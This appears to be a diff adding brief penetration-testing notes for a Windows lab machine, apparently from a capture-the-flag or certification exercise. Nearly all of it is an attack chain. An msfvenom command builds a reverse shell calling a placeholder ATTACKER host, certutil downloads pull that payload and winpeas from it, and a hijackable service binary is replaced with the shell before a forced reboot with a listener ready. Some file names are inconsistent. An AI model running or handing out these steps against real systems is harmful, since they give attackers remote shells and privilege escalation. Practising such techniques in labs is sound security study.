@@ -1,0 +1,47 @@
+
+Outside
+VPN 172....
+Outside 192.....
+Inside 10....
+
+found exe on port 80 /uploads
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o winrev443.exe
+
+certutil.exe -urlcache -f http://ATTACKER/winrev443.exe \windows\temp\windrev443.exe
+or we can use \users\public\windrev443.exe
+
+
+certutil.exe -urlcache -f http://ATTACKER/winpeas.exe winpeas.exe
+
+We hae shutdown permissionss
+No quotes and Space detected AND we have file permissions
+
+
+copy \users\public\winrev443.exe .\HIJACKABLE.exe
+
+sc query
+
+sc query | findstr /i HIJACKABLE
+
+sc qc HIJACKABLE
+
+shutdown /r /t 1
+have listener ready
+
+dir /s/b proof.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
